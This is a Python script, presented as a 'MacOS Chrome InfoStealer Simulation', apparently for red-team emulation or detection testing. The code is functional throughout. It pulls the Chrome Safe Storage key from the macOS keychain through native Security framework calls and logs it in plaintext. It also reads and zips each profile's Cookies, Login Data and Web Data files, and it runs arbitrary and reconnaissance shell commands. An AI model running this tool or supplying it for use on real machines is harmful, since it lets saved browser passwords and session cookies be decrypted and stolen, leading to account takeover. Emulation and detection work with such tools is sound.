#!/usr/bin/env python3
"""
MacOS Chrome InfoStealer Simulation V2

This script simulates the extraction of sensitive information from Google Chrome on macOS systems.
It provides comprehensive functionality for credential access and system reconnaissance:

1. Chrome Credential Access:
   - Retrieves the Chrome safe storage password using native macOS Security framework API calls
   - Copies Chrome browser credential files (Cookies, Login Data, Web Data) to memory
   - Optionally zips the files and saves them to disk
   - Supports multiple Chrome profiles with detection and selection capabilities

2. System Information Gathering:
   - Executes system commands to gather information about the host
   - Provides hardware information using system_profiler
   - Supports custom command execution for targeted information gathering
"""

import argparse
import ctypes
import ctypes.util
import io
import logging
import os
import subprocess
import sys
import zipfile

# Configure logging for better error visibility
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class ChromeProfileManager:
    """Manages Chrome profile detection and file operations."""

    @staticmethod
    def get_chrome_base_dir():
        """Returns the base Chrome directory on macOS."""
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")

    @classmethod
    def list_available_profiles(cls):
        """Lists all available Chrome profiles on the system by scanning the directory."""
        base_dir = cls.get_chrome_base_dir()
        available_profiles = []

        try:
            # List all items in the Chrome directory
            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)

                # Check if it's a directory
                if os.path.isdir(item_path):
                    # Verify it's a profile by checking for common files
                    for common_file in ["Cookies", "Login Data", "Web Data"]:
                        if os.path.exists(os.path.join(item_path, common_file)):
                            available_profiles.append(item)
                            break

            logger.info(
                f"Found {len(available_profiles)} Chrome profiles: {', '.join(available_profiles)}"
            )
            return available_profiles
        except Exception as e:
            logger.error(f"Error listing Chrome profiles: {e}")
            return ["Default"]  # Fallback to Default profile if error occurs

    @classmethod
    def get_profile_path(cls, profile_name):
        """Gets the full path for a specific Chrome profile."""
        return os.path.join(cls.get_chrome_base_dir(), profile_name)


def chrome_dir(profile="Default"):
    """
    Returns the Google Chrome configuration directory for a specific profile on macOS.

    Args:
        profile (str): The Chrome profile name (default: "Default")

    Returns:
        str: The path to the Chrome profile directory
    """
    return ChromeProfileManager.get_profile_path(profile)


def copy_chrome_files(wtd=False, profile="Default", output_file=None):
    """
    Copies Chrome files into memory, prints the size of each file,
    zips them in memory, prints the size of the zip file,
    and writes the zip file to disk if `wtd` is True.

    Args:
        wtd (bool): If True, writes the zip file to disk in the current working directory.
                    If False, only stores the zip in memory and returns None.
        profile (str): The Chrome profile name to extract files from (default: "Default")
        output_file (str, optional): Custom filename for the output zip file

    Returns:
        str or None: Returns the file path of the saved zip file if `wtd` is True.
                     Returns None if `wtd` is False or if an error occurs.
    """
    chrome_files = ["Cookies", "Login Data", "Web Data"]
    zip_buffer = io.BytesIO()
    profile_dir = chrome_dir(profile)

    if not os.path.exists(profile_dir):
        logger.error(f"Chrome profile directory not found: {profile_dir}")
        return None

    logger.info(f"Copying Chrome files from profile: {profile}")

    try:
        # Open a ZipFile object to write files to the in-memory buffer
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for file_name in chrome_files:
                src_file = os.path.join(profile_dir, file_name)
                try:
                    if os.path.exists(src_file):
                        # Read file content to memory and log the size
                        with open(src_file, "rb") as f:
                            file_data = f.read()
                            file_size = len(file_data)
                            logger.info(f"Read {file_name}: {file_size} bytes")
                            zip_file.writestr(f"{profile}/{file_name}", file_data)
                    else:
                        logger.warning(
                            f"{file_name} not found in Chrome profile {profile}."
                        )
                except IOError as io_err:
                    logger.error(f"Error reading {file_name}: {io_err}")
                except Exception as e:
                    logger.error(f"Unexpected error while processing {file_name}: {e}")

        # Calculate size of the zip in memory and log it
        zip_size = zip_buffer.tell()
        logger.info(f"Size of zipped file in memory: {zip_size} bytes")

        # Write the zip file to disk if `wtd` is True
        if wtd:
            zip_buffer.seek(0)  # Reset the buffer position to the beginning
            if output_file:
                zip_file_path = os.path.join(os.getcwd(), output_file)
            else:
                zip_file_path = os.path.join(
                    os.getcwd(), f"chrome_files_{profile.lower()}.zip"
                )
            try:
                with open(zip_file_path, "wb") as f:
                    f.write(zip_buffer.read())
                logger.info(f"Zipped Chrome files saved to {zip_file_path}")
                return os.path.abspath(zip_file_path)  # Return the absolute path
            except IOError as io_err:
                logger.error(f"Error writing zip file to disk: {io_err}")
                return None
            except Exception as e:
                logger.error(f"Unexpected error while saving zip file: {e}")
                return None
        else:
            logger.info("Zip file not written to disk as 'wtd' is set to False.")
            return None

    except zipfile.BadZipFile as bz_err:
        logger.error(f"Failed to create zip in memory: {bz_err}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error during in-memory zip creation: {e}")
        return None


def run_system_commands(commands):
    """
    Executes a list of system commands and displays their output.

    Args:
        commands: List of strings, each containing a system command to run
    """
    if not commands:
        logger.warning("No commands provided to run_system_commands")
        return

    for cmd in commands:
        logger.info(f"Executing command: {cmd}")
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                text=True,
                capture_output=True,
                check=False,  # Don't raise exception on non-zero exit
            )

            if result.stdout:
                logger.info(f"Command output:\n{result.stdout.strip()}")

            if result.stderr:
                logger.warning(f"Command error output:\n{result.stderr.strip()}")

            if result.returncode != 0:
                logger.warning(
                    f"Command exited with non-zero status: {result.returncode}"
                )

        except Exception as e:
            logger.error(f"Error executing command '{cmd}': {e}")


def get_chrome_storage_pass_native():
    """
    Retrieves the Chrome safe storage password using native macOS Security framework API calls.
    This method directly accesses the keychain without spawning a separate process.

    Returns:
        str or None: Returns the Chrome safe storage password if successful, or None if an error occurs.
    """
    # Load the Security framework
    security_lib = ctypes.util.find_library("Security")
    if security_lib is None:
        logger.error("Security framework not found. This function only works on macOS.")
        return None

    security = ctypes.cdll.LoadLibrary(security_lib)

    # Define return variables for password data
    password_data = ctypes.c_void_p()
    password_length = ctypes.c_uint32()

    # Define the service and account names Chrome uses for the safe storage password
    service_name = "Chrome Safe Storage"
    account_name = "Chrome"

    # Convert the service and account names to C-style strings
    service_name_c = ctypes.create_string_buffer(service_name.encode("utf-8"))
    account_name_c = ctypes.create_string_buffer(account_name.encode("utf-8"))

    logger.debug(
        "Calling SecKeychainFindGenericPassword to retrieve Chrome safe storage password"
    )

    # Call the SecKeychainFindGenericPassword function
    status = security.SecKeychainFindGenericPassword(
        None,  # Default keychain (NULL)
        len(service_name),
        service_name_c,
        len(account_name),
        account_name_c,
        ctypes.byref(password_length),
        ctypes.byref(password_data),
        None,  # We don't need an item reference
    )

    try:
        # Check if the password retrieval was successful
        if status == 0:  # errSecSuccess
            # Convert the password data to a Python string
            password = ctypes.string_at(password_data, password_length.value).decode(
                "utf-8"
            )
            logger.info(
                "Chrome safe storage password retrieved successfully using native API."
            )
            return password
        else:
            # Log the error code if retrieval failed
            logger.error(
                f"Failed to retrieve Chrome safe storage password. Status code: {status}"
            )
            return None
    finally:
        # Ensure we always free the password data, even if an error occurred
        if password_data:
            security.SecKeychainItemFreeContent(None, password_data)


def parse_arguments():
    """
    Parse command-line arguments.

    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(
        description="MacOS Chrome InfoStealer Simulation V2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Chrome credential access
  python main.py --getSafe --memCopy
  python main.py --getSafe --diskCopy --profile "Profile 1"
  python main.py --listProfiles
  python main.py --allProfiles --getSafe --memCopy

  # System information gathering
  python main.py --systemInfo
  python main.py --systemInfo --commands "uname -a" "ifconfig" "ls -la ~"

  # Combined operations
  python main.py --getSafe --memCopy --systemInfo --verbose
  python main.py --allProfiles --diskCopy --systemInfo --commands "ps aux | grep Chrome"
        """,
    )

    # Core functionality options
    parser.add_argument(
        "-g",
        "--getSafe",
        action="store_true",
        help="Retrieve Chrome safe storage password using native API",
    )
    parser.add_argument(
        "-d",
        "--diskCopy",
        action="store_true",
        help="Copy Chrome data files to disk",
    )
    parser.add_argument(
        "-m",
        "--memCopy",
        action="store_true",
        help="Copy Chrome data files to memory",
    )
    parser.add_argument(
        "-s",
        "--systemInfo",
        action="store_true",
        help="Run system information commands",
    )
    parser.add_argument(
        "-c",
        "--commands",
        nargs="+",
        help="Custom system commands to run (use with --systemInfo)",
    )

    # Profile options
    parser.add_argument(
        "-l",
        "--listProfiles",
        action="store_true",
        help="List available Chrome profiles",
    )
    parser.add_argument(
        "-p",
        "--profile",
        default="Default",
        help="Chrome profile to use (default: Default)",
    )
    parser.add_argument(
        "-a",
        "--allProfiles",
        action="store_true",
        help="Process all available Chrome profiles",
    )

    # Other options
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose logging"
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Specify output file name for disk copies (default: chrome_files_<profile>.zip)",
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't delete files after creating them (for --diskCopy)",
    )

    # Additional system information options
    parser.add_argument(
        "--network-info",
        action="store_true",
        help="Run network-related commands (ifconfig, netstat, etc.)",
    )
    parser.add_argument(
        "--user-info",
        action="store_true",
        help="Run user-related commands (whoami, id, groups, etc.)",
    )

    return parser.parse_args()


def main():
    """
    Main function that parses command-line arguments and executes the requested actions.
    """
    args = parse_arguments()

    # Configure logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logger.debug("Verbose logging enabled")

    logger.info(
        f"Arguments received: getSafe={args.getSafe}, diskCopy={args.diskCopy}, "
        f"memCopy={args.memCopy}, profile={args.profile}, "
        f"listProfiles={args.listProfiles}, allProfiles={args.allProfiles}"
    )

    # List available profiles if requested
    if args.listProfiles:
        profiles = ChromeProfileManager.list_available_profiles()
        if profiles:
            logger.info(f"Available Chrome profiles: {', '.join(profiles)}")
        else:
            logger.error("No Chrome profiles found")
        return

    # Determine which profiles to process
    profiles_to_process = []
    if args.allProfiles:
        profiles_to_process = ChromeProfileManager.list_available_profiles()
        if not profiles_to_process:
            logger.error("No Chrome profiles found")
            return
    else:
        profiles_to_process = [args.profile]

    # Check for conflicting options
    if args.diskCopy and args.memCopy:
        logger.error("Cannot use both --diskCopy and --memCopy at the same time.")
        sys.exit(1)

    # Run system commands if requested
    if args.systemInfo or args.network_info or args.user_info:
        commands = []

        if args.commands:
            commands.extend(args.commands)

        if args.systemInfo and not args.commands:
            commands.append("system_profiler SPHardwareDataType")

        if args.network_info:
            commands.extend(
                ["ifconfig", "netstat -rn", "networksetup -listallnetworkservices"]
            )

        if args.user_info:
            commands.extend(["whoami", "id", "groups", "last $(whoami) | head -5"])

        run_system_commands(commands)

    # Get Chrome safe storage password if requested (only once, as it's the same for all profiles)
    password = None
    if args.getSafe:
        password = get_chrome_storage_pass_native()
        if password:
            logger.info(f"Chrome Safe Storage Password: {password}")
        else:
            logger.error("Failed to retrieve Chrome Safe Storage password.")

    # Process each profile
    for profile in profiles_to_process:
        logger.info(f"Processing Chrome profile: {profile}")

        # Copy Chrome files to disk if requested
        if args.diskCopy:
            result = copy_chrome_files(
                wtd=True, profile=profile, output_file=args.output
            )
            if result is not None:
                logger.info(f"File created at: {result}")

                # Clean up the file after creating it (unless --no-cleanup is specified)
                if os.path.isfile(result) and not args.no_cleanup:
                    try:
                        os.remove(result)
                        logger.info(f"File {result} has been deleted.")
                    except Exception as e:
                        logger.error(f"Error deleting file {result}: {e}")

        # Copy Chrome files to memory if requested
        elif args.memCopy:
            result = copy_chrome_files(wtd=False, profile=profile)
            if result is not None:
                logger.info(f"Chrome files from profile {profile} copied to memory.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Operation cancelled by user")
        sys.exit(130)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)
